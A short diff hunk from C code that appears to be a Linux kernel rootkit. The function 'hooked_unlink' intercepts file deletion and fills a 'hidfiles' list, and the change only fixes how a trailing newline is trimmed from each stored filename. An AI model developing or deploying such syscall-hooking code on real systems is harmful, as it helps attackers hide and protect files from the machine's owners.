@@ -155,7 +155,11 @@ asmlinkage long hooked_unlink(const char __user *filename){
             }
         }
         if(j>0){
-            value[j] = '\0';
+            if(value[j-1] == '\n'){
+                value[j-1] = '\0';
+            } else {
+                value[j] = '\0';
+            }
             hidfiles[filenum] = value;
             filenum++;
         }
